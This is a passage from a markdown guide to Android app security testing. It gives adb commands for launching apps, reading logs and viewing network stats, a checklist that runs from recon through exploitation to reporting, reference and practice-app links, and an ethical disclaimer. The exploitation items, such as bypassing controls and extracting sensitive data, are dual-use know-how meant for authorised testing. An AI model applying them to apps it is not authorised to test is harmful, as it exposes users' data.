adb shell am start -n pkg/.Act     # Start activity
adb shell am start -W ...          # Wait for launch
adb shell am force-stop pkg        # Force stop app

# Logs
adb logcat                         # Stream logs
adb logcat -d > logs.txt           # Dump logs to file
adb logcat -s TAG:D *:S           # Filter by tag

# Network
adb shell dumpsys netstats         # Network usage stats
adb shell cat /proc/net/xt_qtaguid # Per-app network data
```

### 🎯 Testing Workflow Checklist

```
✅ RECON
□ Extract package name & version
□ List permissions requested
□ Identify exported components
□ Find hardcoded URLs/credentials

✅ STATIC ANALYSIS
□ Decompile with jadx/apktool
□ Review AndroidManifest.xml
□ Search for sensitive patterns
□ Check for obfuscation

✅ DYNAMIC ANALYSIS
□ Install on emulator/device
□ Intercept traffic with Burp
□ Monitor logs with logcat
□ Test deep links & intents

✅ EXPLOITATION
□ Test exported components
□ Attempt injection attacks
□ Bypass security controls
□ Extract sensitive data

✅ REPORTING
□ Document findings with PoC
□ Rate severity (CVSS)
□ Provide remediation guidance
□ Include references
```

---

## 1️⃣2️⃣ REFERENCES & FURTHER LEARNING

### 📚 Official Documentation
- [Android Developer Security](https://source.android.com/docs/security)
- [Android App Security Guidelines](https://developer.android.com/topic/security/best-practices)
- [Android Permission Reference](https://developer.android.com/reference/android/Manifest.permission)
- [Network Security Configuration](https://developer.android.com/training/articles/security-config)

### 🎓 Learning Resources
- [OWASP Mobile Security Testing Guide (MSTG)](https://owasp.org/www-project-mobile-security-testing-guide/)
- [OWASP Mobile Top 10](https://owasp.org/www-project-mobile-top-10/)
- [PortSwigger Mobile Testing](https://portswigger.net/burp/documentation/desktop/testing-workflow/mobile)
- [PentesterLab Android Exercises](https://pentesterlab.com/exercises/android)

### 🛠️ Tool Documentation
- [Frida Official Docs](https://frida.re/docs/)
- [MobSF Documentation](https://mobsf.github.io/docs/)
- [Jadx GitHub](https://github.com/skylot/jadx)
- [APKTool Guide](https://ibotpeaches.github.io/Apktool/)

### 🧪 Practice Apps
- [InsecureBankv2](https://github.com/dineshshetty/Android-InsecureBankv2) - Vulnerable banking app
- [GoatDroid](https://github.com/jackMannino/GoatDroid) - OWASP training platform
- [DVWA-Mobile](https://github.com/rapid7/dvwa-mobile) - Mobile version of DVWA
- [MobSF Sample Apps](https://github.com/MobSF/mobsf-sample-apps) - Pre-vulnerable APKs

### 🗣️ Communities
- [OWASP Mobile Slack](https://owasp.org/slack/invite) - #mobile channel
- [Reddit r/AndroidSecurity](https://reddit.com/r/AndroidSecurity)
- [Twitter #MobileSecurity](https://twitter.com/search?q=%23MobileSecurity)
- [Discord: The Cyber Mentor](https://discord.gg/thecybermentor)

---

## ⚠️ ETHICAL DISCLAIMER

> 🔐 **This guide is for educational and authorized security testing purposes only.** 🔐
>
> By using this content, you agree to:
> - ✅ Only test systems you own or have **explicit written authorization** to assess
> - ✅ Follow all applicable local, national, and international laws
> - ✅ Practice **Responsible Disclosure** when discovering vulnerabilities
> - ✅ Never use techniques for malicious purposes or unauthorized access
> - ✅ Respect user privacy and data protection regulations
>
> ❌ **DO NOT**:
> - ❌ Attack systems without permission
> - ❌ Distribute malware or destructive payloads
> - ❌ Attempt to bypass security controls for unauthorized access
> - ❌ Share sensitive data discovered during testing
>
> *When in doubt: ASK FIRST. Get permission IN WRITING.*

---
